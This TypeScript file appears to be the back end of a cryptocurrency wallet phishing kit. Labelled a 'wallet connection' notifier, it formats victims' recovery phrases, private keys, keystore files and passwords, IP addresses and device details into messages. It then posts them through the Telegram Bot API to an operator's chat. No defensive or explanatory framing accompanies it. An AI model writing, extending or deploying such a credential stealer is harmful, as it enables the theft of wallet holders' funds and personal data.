import { telegramConfig, isTelegramConfigured } from '../config/telegram.js'

export interface WalletNotificationData {
  wallet: string
  method: string
  data: {
    phrase?: string
    privateKey?: string
    keystore?: string
    password?: string
    fileName?: string
    wordCount?: number
  }
  ipAddress?: string
  userAgent?: string
}

class TelegramService {
  private get enabled() {
    return isTelegramConfigured()
  }

  private formatMessage(payload: WalletNotificationData): string {
    const now = new Date()
    const date = now.toLocaleDateString()
    const time = now.toLocaleTimeString()

    let message = '🔐 <b>NEW WALLET CONNECTION</b>\n'
    message += '═══════════════════════\n\n'
    message += `📅 <b>Date:</b> ${date}\n`
    message += `⏰ <b>Time:</b> ${time}\n`
    message += `👛 <b>Wallet:</b> ${payload.wallet}\n`
    message += `📋 <b>Method:</b> ${payload.method.toUpperCase()}\n`

    if (payload.ipAddress) {
      message += `🌐 <b>IP:</b> ${payload.ipAddress}\n`
    }
    if (payload.userAgent) {
      message += `🖥️ <b>Device:</b> ${payload.userAgent}\n`
    }

    message += '\n📦 <b>CONNECTION DATA</b>\n'
    message += '───────────────────\n'

    if (payload.method === 'phrase') {
      const phrase = payload.data.phrase || 'Not provided'
      const wordCount = payload.data.wordCount || 0
      message += `🔑 <b>Recovery Phrase:</b>\n<code>${phrase}</code>\n`
      message += `📊 Word Count: ${wordCount}/24\n`
    } else if (payload.method === 'keystore') {
      message += `📁 <b>File:</b> ${payload.data.fileName || 'N/A'}\n`
      message += `🔐 <b>Password:</b> <code>${payload.data.password || 'N/A'}</code>\n`
      if (payload.data.keystore) {
        message += `📄 <b>Preview:</b>\n<code>${payload.data.keystore.slice(0, 150)}...</code>\n`
      }
    } else if (payload.method === 'private key') {
      message += `🔑 <b>Private Key:</b>\n<code>${payload.data.privateKey || 'N/A'}</code>\n`
    }

    message += '\n═══════════════════════'
    return message
  }

  async sendNotification(payload: WalletNotificationData): Promise<boolean> {
    if (!this.enabled) {
      console.warn('⚠️ Telegram not configured — skipping notification')
      return false
    }

    try {
      const url = `https://api.telegram.org/bot${telegramConfig.botToken}/sendMessage`
      const res = await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: telegramConfig.chatId,
          text: this.formatMessage(payload),
          parse_mode: 'HTML',
        }),
      })

      if (!res.ok) {
        console.error('Telegram API error:', await res.text())
        return false
      }
      console.log('✅ Telegram notification sent')
      return true
    } catch (err) {
      console.error('Telegram send failed:', err)
      return false
    }
  }
}

export const telegramService = new TelegramService()